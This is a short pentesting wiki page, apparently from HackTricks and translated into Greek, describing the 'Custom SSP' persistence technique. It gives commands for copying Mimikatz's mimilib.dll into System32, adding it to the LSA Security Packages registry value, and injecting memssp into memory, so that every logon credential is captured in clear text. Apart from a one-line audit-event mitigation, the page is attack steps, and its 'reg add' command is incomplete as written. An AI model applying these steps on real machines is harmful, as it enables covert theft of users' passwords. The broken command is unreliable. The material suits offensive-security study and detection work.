# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Μάθετε εδώ τι είναι ένα SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράφετε** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο μηχάνημα.

#### Mimilib

Μπορείτε να χρησιμοποιήσετε το binary `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράφει σε ένα αρχείο όλα τα credentials σε clear text.**\
Αποθέστε το dll στο `C:\Windows\System32\`\
Λάβετε μια λίστα με τα υπάρχοντα LSA Security Packages:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Προσθέστε το `mimilib.dll` στη λίστα των Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Και μετά από μια επανεκκίνηση, όλα τα credentials μπορούν να βρεθούν σε clear text στο `C:\Windows\System32\kiwissp.log`

#### Στη μνήμη

Μπορείτε επίσης να το κάνετε inject απευθείας στη μνήμη χρησιμοποιώντας το Mimikatz (σημειώστε ότι μπορεί να είναι κάπως ασταθές/να μην λειτουργεί):
```bash
privilege::debug
misc::memssp
```
Αυτό δεν θα επιβιώσει μετά από επανεκκινήσεις.

#### Μετριασμός

Event ID 4657 - Audit δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
